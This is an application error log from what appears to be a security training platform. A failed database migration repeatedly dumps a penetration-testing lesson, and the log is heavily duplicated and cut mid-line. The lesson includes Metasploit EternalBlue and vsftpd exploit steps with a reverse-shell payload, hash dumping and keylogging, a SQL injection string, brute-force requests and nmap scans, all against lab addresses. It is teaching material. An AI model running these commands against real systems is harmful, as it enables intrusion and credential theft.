Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:52:43.652 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
